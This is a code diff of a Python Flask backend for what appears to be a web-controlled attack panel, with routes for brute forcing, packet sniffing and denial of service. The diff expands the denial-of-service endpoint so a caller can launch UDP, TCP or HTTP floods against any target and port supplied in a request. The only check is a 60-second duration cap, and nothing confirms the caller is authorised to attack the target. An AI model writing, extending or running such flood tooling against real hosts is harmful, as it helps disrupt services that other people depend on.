@@ -108,25 +108,42 @@ def brute_force():
         traceback.print_exc()
         return jsonify({'error': f"Server Error: {str(e)}"}), 500
 
-@app.route('/api/attack/dos', methods=['POST'])
-def dos_attack():
+@app.route('/api/attack/analyze', methods=['POST'])
+def analyze_target():
     data = request.json
     target = data.get('target')
-    try:
-        port = int(data.get('port'))
-        duration = int(data.get('duration'))
-    except (ValueError, TypeError):
-        return jsonify({'error': 'Port and Duration must be integers'}), 400
+    port = data.get('port', 80)
+    
+    if not target:
+        return jsonify({'error': 'Target is required'}), 400
+        
+    result = attack_modules.check_target(target, port)
+    return jsonify(result)
 
-    if not target or not port or not duration:
-        return jsonify({'error': 'Missing required fields'}), 400
-
-    # Limit duration for safety
+@app.route('/api/attack/dos', methods=['POST'])
+def attack_dos():
+    data = request.json
+    target = data.get('target')
+    port = int(data.get('port', 80))
+    duration = int(data.get('duration', 60))
+    packet_size = int(data.get('packet_size', 1024))
+    attack_type = data.get('type', 'udp').lower()
+    
+    # Safety Check
     if duration > 60:
-        return jsonify({'error': 'Duration limited to 60 seconds for safety'}), 400
-
-    print(f"[DEBUG] Starting UDP Flood on {target}:{port} for {duration}s")
-    result = attack_modules.udp_flood(target, port, duration)
+        duration = 60
+        
+    print(f"Starting {attack_type.upper()} Flood on {target}:{port} for {duration}s")
+    
+    if attack_type == 'udp':
+        result = attack_modules.udp_flood(target, port, duration, packet_size)
+    elif attack_type == 'tcp':
+        result = attack_modules.tcp_flood(target, port, duration)
+    elif attack_type == 'http':
+        result = attack_modules.http_flood(target, port, duration)
+    else:
+        return jsonify({'error': 'Invalid attack type'}), 400
+    
     return jsonify(result)
 
 @app.route('/api/sniff', methods=['POST'])
